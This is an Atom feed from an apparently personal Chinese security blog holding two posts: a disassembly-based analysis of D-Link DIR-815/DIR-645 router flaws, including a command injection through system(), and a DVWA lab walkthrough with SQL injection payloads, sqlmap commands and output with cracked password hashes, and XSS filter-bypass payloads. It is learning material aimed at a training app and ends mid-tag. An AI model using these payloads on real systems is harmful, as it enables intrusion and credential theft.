<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-07-20T01:11:37.883Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IOT D-link</title>
    <link href="https://prontosil.club/2019/07/20/IOT-D-link/"/>
    <id>https://prontosil.club/2019/07/20/IOT-D-link/</id>
    <published>2019-07-20T01:05:47.000Z</published>
    <updated>2019-07-20T01:11:37.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DIR-815栈溢出漏洞"><a href="#DIR-815栈溢出漏洞" class="headerlink" title="DIR-815栈溢出漏洞"></a>DIR-815栈溢出漏洞</h1><p>屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。<br>所以这个栈溢出是不存在的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0040BE04 move    $a3, $s2</span><br><span class="line">.text:0040BE08 la      $a2, aSSPostxml                  # &quot;%s/%s/postxml&quot;</span><br><span class="line">.text:0040BE0C move    $a0, $s1                         # s</span><br><span class="line">.text:0040BE10 li      $a1, 0x400                       # maxlen</span><br><span class="line">.text:0040BE14 jalr    $t9 ; snprintf</span><br><span class="line">.text:0040BE18 sw      $v0, 0x4F0+var_4E0($sp)</span><br><span class="line">.text:0040BE1C lw      $gp, 0x4F0+var_4D8($sp)</span><br><span class="line">.text:0040BE20 move    $a2, $s1</span><br><span class="line">.text:0040BE24 la      $t9, xmldbc_del</span><br></pre></td></tr></table></figure><h1 id="DIR-645-缓冲区溢出漏洞"><a href="#DIR-645-缓冲区溢出漏洞" class="headerlink" title="DIR-645 缓冲区溢出漏洞"></a>DIR-645 缓冲区溢出漏洞</h1><p>动态调试：<br>在<code>authenticationcgi_main</code>处下断点</p><p>此时返回地址保存在这里：<br><img src="https://i.imgur.com/oh6ghYW.png" alt="645-0"></p><p>之后运行到此处：<br><img src="https://i.imgur.com/ANbYbap.png" alt="645-1"></p><p>此时返回地址被覆盖了<br><img src="https://i.imgur.com/FPyCjMv.png" alt="645-2"></p><p>继续运行，程序果然崩溃了<br><img src="https://i.imgur.com/FL4my7C.png" alt="645-3"></p><p>进入到函数<code>sub40A424</code><br>程序在此时崩溃了<br><img src="https://i.imgur.com/OXwIv4A.png" alt="645-4"></p><p>尝试修改password长度<br><img src="https://i.imgur.com/DVBCxyS.png" alt="645-5"><br>程序还是崩溃了<br><img src="https://i.imgur.com/MpSoECY.png" alt="645-6"><br>查看反汇编代码<br>程序从外部读入<code>CONTENT_LENGTH</code>没有进行任何检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">text:0040B4A0                 la      $t9, getenv</span><br><span class="line">.text:0040B4A4                 la      $a0, aContent_length  # &quot;CONTENT_LENGTH&quot;</span><br><span class="line">.text:0040B4A8                 jalr    $t9 ; getenv</span><br><span class="line">.text:0040B4AC                 move    $s0, $v0</span><br><span class="line">.text:0040B4B0                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4B4                 beqz    $s0, loc_40B610</span><br><span class="line">.text:0040B4B8                 addiu   $a0, $sp, 0xF90+var_938</span><br><span class="line">.text:0040B4BC                 beqz    $v0, loc_40B614</span><br><span class="line">.text:0040B4C0                 addiu   $a1, $sp, 0xF90+var_E1C</span><br><span class="line">.text:0040B4C4                 la      $t9, atoi</span><br><span class="line">.text:0040B4C8                 nop</span><br><span class="line">.text:0040B4CC                 jalr    $t9 ; atoi</span><br><span class="line">.text:0040B4D0                 move    $a0, $v0         # nptr</span><br><span class="line">.text:0040B4D4                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4D8                 move    $s0, $v0</span><br><span class="line">.text:0040B4DC                 la      $v1, stdin</span><br><span class="line">.text:0040B4E0                 la      $t9, fileno</span><br><span class="line">.text:0040B4E4                 lw      $a0, (stdin - 0x4353CC)($v1)  # stream</span><br><span class="line">.text:0040B4E8                 jalr    $t9 ; fileno</span><br><span class="line">.text:0040B4EC                 addiu   $s1, $sp, 0xF90+var_430</span><br><span class="line">.text:0040B4F0                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4F4                 move    $a0, $v0         # fd</span><br><span class="line">.text:0040B4F8                 la      $t9, read</span><br><span class="line">.text:0040B4FC                 move    $a1, $s1         # buf</span><br><span class="line">.text:0040B500                 jalr    $t9 ; read</span><br></pre></td></tr></table></figure></p><p>计算偏移量；<br><img src="https://i.imgur.com/a2gu75K.png" alt="645-7"></p><p>后面的利用过程感觉比较复杂，没能成功地复现</p><h1 id="DIR-645命令执行漏洞"><a href="#DIR-645命令执行漏洞" class="headerlink" title="DIR-645命令执行漏洞"></a>DIR-645命令执行漏洞</h1><p>在安全客上看到了一篇分析DIR-645命令执行地文章，随分析一下原理</p><p>直接查看<code>servicecgi_main</code>函数</p><p>首先会对请求方法进行判断，如果是POST方法则会调用<code>cgibin_parse_request</code>解析参数，具体的实现暂时不考虑，主要是解析CONTENT_TYPE和CONTENT_LENGTH,之后会调用<code>sess_ispoweruser</code>判断是否为合法用户<br>之后获取 POST 表单字段，若字段名为 EVENT 的话，就将 “event %s &gt; /dev/null” 作为参数执行 lxmldbc_system 函数。<br>查看<code>lxmldbc_system</code>函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sw      $a1, 0x428+arg_4($sp)</span><br><span class="line">sw      $a2, 0x428+arg_8($sp)</span><br><span class="line">sw      $a3, 0x428+arg_C($sp)</span><br><span class="line">move    $a2, $a0         # format</span><br><span class="line">move    $a3, $v0         # arg</span><br><span class="line">move    $a0, $s0         # s</span><br><span class="line">sw      $v0, 0x428+var_410($sp)</span><br><span class="line">jalr    $t9 ; vsnprintf  </span><br><span class="line">li      $a1, 0x400       # maxlen</span><br></pre></td></tr></table></figure></p><p>主要关注最后两条指令，因为这里用到了MIPS中地分支延迟槽技术，所以<code>$a1</code>传递参数的指令存放在<code>jalr</code>指令之后<br>故<code>vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4)</code><br>vsnprintf函数的用法：</p><blockquote><p>函数原型：int vsnprintf(char str, size_t size, const char format,va_list ap);<br>函数说明：将可变参数格式化输出到一个字符数组<br>参数：str输出到的数组，size指定大小，防止越界，format格式化参数，ap可变参数列表函数用法</p></blockquote><p>接着调用system函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jalr    $t9 ; system</span><br><span class="line">move    $a0, $s0         # command</span><br></pre></td></tr></table></figure></p><p>看一下参数的传递过程<br><img src="https://i.imgur.com/GJkYz9r.png" alt="645-8"></p><p><code>$s0</code>本来是栈上的一个变量，<code>vsnprintf</code>将可变参数格式化输出到其中，之后又将其作为参数传递给<code>system</code>函数</p><p>相当于执行了<br><code>system(&quot;event %s &gt; /dev/null&quot;)</code></p><p>这样就可以想办法进行命令注入了</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.zybuluo.com/H4l0/note/1461277" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DIR-815栈溢出漏洞&quot;&gt;&lt;a href=&quot;#DIR-815栈溢出漏洞&quot; class=&quot;headerlink&quot; title=&quot;DIR-815栈溢出漏洞&quot;&gt;&lt;/a&gt;DIR-815栈溢出漏洞&lt;/h1&gt;&lt;p&gt;屡次调试都失败了，我才发现原来这个版本的DIR-815已经修
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
  </entry>
  
  <entry>
    <title>DVWA学习</title>
    <link href="https://prontosil.club/2019/07/20/DVWA%E5%AD%A6%E4%B9%A0/"/>
    <id>https://prontosil.club/2019/07/20/DVWA学习/</id>
    <published>2019-07-20T01:05:02.000Z</published>
    <updated>2019-07-20T01:11:00.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>用的vulstudy的环境<br>默认用户名是<code>admin</code>密码是<code>password</code><br>需要启动的时候<code>docker-compose up -d</code>就行了<br>停止的话<code>docker-compose stop</code>停止容器</p><h2 id="sql注入-最简单的"><a href="#sql注入-最简单的" class="headerlink" title="sql注入 最简单的"></a>sql注入 最简单的</h2><p>没办法是我太菜了，权当复习好了:cry:</p><p>输入1得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br></pre></td></tr></table></figure></p><p>然后开始爆字段</p><blockquote><p>1’ order by 2 #</p></blockquote><p>确认回显位置：</p><blockquote><p>1’ union select 1,2 #</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select 1,2 #</span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure><p>开始爆数据库</p><blockquote><p>1’ union select database(),2 #<br>得到数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select database(),2 #</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p></blockquote><p>开始爆表<br>表都存在<code>information_schema.tables</code>这里面</p><blockquote><p>1’ union select table_name,2 from information_schema.tables where table_schema= ‘dvwa’#</p></blockquote><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</span><br><span class="line">First name: guestbook</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</span><br><span class="line">First name: users</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p><p>开始爆字段<br>然而我并不知道怎么爆字段:disappointed:<br>于是猜测是<code>password</code></p><blockquote><p>1’ union select password,2 from users</p></blockquote><p>得到了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: e99a18c428cb38d5f260853678922e03</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p><p>小白之旅到此结束</p><h3 id="升级到medium"><a href="#升级到medium" class="headerlink" title="升级到medium"></a>升级到medium</h3><p>改成了post方式提交数据<br>这时候<code>sqlmap</code>派上用场了</p><p>先将抓到的数据包保存为<code>dvwa.txt</code>文件<br>然后</p><blockquote><p>python sqlmap.py -r “dvwa.txt” —dbs</p></blockquote><p>sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[22:21:04] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure><p>不过这个payload很神奇<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: id=1 AND SLEEP(5)&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit</span><br></pre></td></tr></table></figure></p><p>指定数据库爆表</p><blockquote><p>python sqlmap.py -r “dvwa.txt” -D dvwa —tables</p></blockquote><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">[2 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| guestbook |</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure></p><p>指定表爆字段</p><blockquote><p>python sqlmap.py -r “dvwa.txt” -D dvwa -T users —columns</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[8 columns]</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| Column       | Type        |</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| user         | varchar(15) |</span><br><span class="line">| avatar       | varchar(70) |</span><br><span class="line">| failed_login | int(3)      |</span><br><span class="line">| first_name   | varchar(15) |</span><br><span class="line">| last_login   | timestamp   |</span><br><span class="line">| last_name    | varchar(15) |</span><br><span class="line">| password     | varchar(32) |</span><br><span class="line">| user_id      | int(6)      |</span><br><span class="line">+--------------+-------------+</span><br></pre></td></tr></table></figure><p>指定表然后dump数据</p><blockquote><p>python sqlmap.py -r “dvwa.txt” -D dvwa -T users —dump-all</p></blockquote><p>sqlmap很机智的在破解md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;</span><br><span class="line">[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;</span><br><span class="line">[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos;</span><br></pre></td></tr></table></figure></p><p>得到的表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">| user_id | avatar                                           | user    | password                                    | last_name | first_name | last_login          | failed_lo</span><br><span class="line">gin |</span><br><span class="line">+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+----------</span><br><span class="line">----+</span><br><span class="line">| 1       | http://192.168.41.161/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 2       | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 3       | http://192.168.41.161/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 4       | http://192.168.41.161/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 5       | http://192.168.41.161/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br></pre></td></tr></table></figure></p><p>sqlmap tql tql tql</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>这时候就很。。<br><img src="https://i.loli.net/2019/07/15/5d2c8e18e504271047.png" alt="high"></p><p>会弹出一个页面，输入数据之后再跳回来<br>这就很安全了:stuck_out_tongue:<br>但是。。<br>查看源码之后发现：<br>其实没有任何过滤；<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check database</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br></pre></td></tr></table></figure></p><p>所以payload照样用，没问题</p><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p>这次就更不一般了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Make sure only 1 result is returned</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[ &apos;first_name&apos; ];</span><br><span class="line">$last  = $row[ &apos;last_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里用到了PDO预编译的方式<br>那可能就真的没办法了</p><p>看了下<code>stackoverflow</code><br><a href="https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php/60496#60496" target="_blank" rel="noopener">How can I prevent SQL injection in PHP?</a></p><blockquote><p>Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.</p></blockquote><p>可以有两种方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));</span><br><span class="line"></span><br><span class="line">foreach ($stmt as $row) &#123;</span><br><span class="line">    // Do something with $row</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>或者对于mysql来说，可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);</span><br><span class="line">$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">while ($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">    // Do something with $row</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PDO真的是安全的吗？<br><a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection" target="_blank" rel="noopener">Are PDO prepared statements sufficient to prevent SQL injection?</a><br><a href="https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602" target="_blank" rel="noopener">SQL injection that gets around mysql_real_escape_string()</a></p><h2 id="XSS-reflected"><a href="#XSS-reflected" class="headerlink" title="XSS reflected"></a>XSS reflected</h2><p>第一遍在chrome上试了下<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>没成功<br>但是看源码：</p><p><img src="https://i.loli.net/2019/07/15/5d2c94341de9b41277.png" alt="xss0"></p><p>可能是chrome太安全了吧<br>换成firefox就没事了</p><p><img src="https://i.loli.net/2019/07/15/5d2c9456115fc37192.png" alt="xss1"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>如果看源码就会发现只是简单地对<code>script</code>进行了一次过滤</p><p><code>$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code><br>那么如何绕过这个限制呢</p><p>那就这样构造<br><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code><br>就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了</p><p>ps. 大小写也可以</p><p><img src="https://i.loli.net/2019/07/15/5d2c954361c0181578.png" alt="xss2"></p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次过滤更严格了<br><code>$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</code></p><p>最后只留了一个<code>&gt;</code>给你</p><p>果然我记得还有<code>img</code>标签也可以造成xss来着<br><code>&lt;img src=&quot;aa&quot; onError=alert(123) &gt;</code><br>这样就行啦，当然chrome太安全了，还是用firefox吧</p><h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>这种情况下还进行了实体编码，看你怎么绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a></p><p>一篇总结了xss的文章</p><h2 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h2><p>从low开始看起，<br>直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它</p><h3 id="mediume"><a href="#mediume" class="headerlink" title="mediume"></a>mediume</h3><p>一样的，只是数据包变成了post方式提交的</p><h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p>这次sqlmap抽风没跑出来<br>看下源码好了<br>本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来</p><p>如何盲注？</p><p><a href="https://www.anquanke.com/post/id/170626#h3-18" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></p><p>盲注最常见的一个payload<br><code>127.0.0.1/sqllib/Less-5/?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+</code> 判断数据库中第一个表的第一个字符为否为’P’</p><h2 id="xss-存储型"><a href="#xss-存储型" class="headerlink" title="xss 存储型"></a>xss 存储型</h2><p>还是最简单的low<br>表单上的<code>name</code>有长度限制，不过这只是前端的限制而已<br><code>&lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt;</code><br>注入成功</p><h3 id="medium-1"><a href="#medium-1" class="headerlink" 